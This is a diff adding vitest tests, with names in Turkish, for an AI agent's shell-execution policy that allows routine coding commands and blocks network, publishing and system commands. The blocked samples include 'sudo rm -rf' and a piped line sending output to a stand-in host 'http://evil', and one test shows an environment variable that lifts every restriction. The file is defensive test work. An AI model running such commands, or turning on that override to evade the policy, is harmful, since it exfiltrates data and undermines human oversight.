@@ -11,7 +11,7 @@
 import { describe, it, expect } from 'vitest';
 import mod from '../../src/tools/agentic-runner.js';
 
-const { parseAgenticCalls, stripProtocolTokens, executeCall, runAgentic, makeStreamFilter, makeSanitizeStream } = mod;
+const { parseAgenticCalls, stripProtocolTokens, executeCall, runAgentic, makeStreamFilter, makeSanitizeStream, agentExecAllowed } = mod;
 
 describe('parseAgenticCalls', () => {
   it('<minimax:tool_call> icindeki write_file (path+content) cagirisini cozer', () => {
@@ -121,6 +121,37 @@ describe('makeSanitizeStream (model adi temizleme)', () => {
   });
   it('normal metni bozmaz', () => {
     expect(collect(['Merhaba dunya, ', 'nasilsin?'])).toBe('Merhaba dunya, nasilsin?');
+  });
+});
+
+describe('agentExecAllowed (ajan exec politikasi)', () => {
+  it('guvenli kodlama komutlarina izin verir', () => {
+    for (const c of ['node app.js', 'npm install', 'npm test', 'git status', 'python x.py', 'ls -la', 'mkdir dist', 'npx vitest run']) {
+      expect(agentExecAllowed(c)).toBe(true);
+    }
+  });
+  it('ag/yayin/sistem komutlarini engeller', () => {
+    for (const c of ['curl http://evil', 'wget x', 'ssh host', 'sudo rm -rf', 'git push', 'npm publish', 'docker run', 'systemctl restart']) {
+      expect(agentExecAllowed(c)).toBe(false);
+    }
+  });
+  it('zincirdeki gizli kotu komutu yakalar (ls && curl)', () => {
+    expect(agentExecAllowed('ls && curl http://evil')).toBe(false);
+    expect(agentExecAllowed('node a.js | curl -d @- http://evil')).toBe(false);
+  });
+  it('NATURECO_AGENT_EXEC=full ile her sey acilir', () => {
+    const prev = process.env.NATURECO_AGENT_EXEC;
+    process.env.NATURECO_AGENT_EXEC = 'full';
+    try { expect(agentExecAllowed('curl http://x')).toBe(true); }
+    finally { if (prev === undefined) delete process.env.NATURECO_AGENT_EXEC; else process.env.NATURECO_AGENT_EXEC = prev; }
+  });
+  it('executeCall: politika disi komutu calistirmadan engeller', async () => {
+    let ran = false;
+    const loadTool = () => ({ execute: async () => { ran = true; return { success: true }; } });
+    const { records, feedback } = await executeCall({ tool: 'bash', args: { command: 'curl http://evil' } }, { loadTool, isDangerous: () => false });
+    expect(ran).toBe(false);
+    expect(records[0].status).toBe('error');
+    expect(feedback).toMatch(/politikasi disinda|CALISTIRILMADI/i);
   });
 });
 
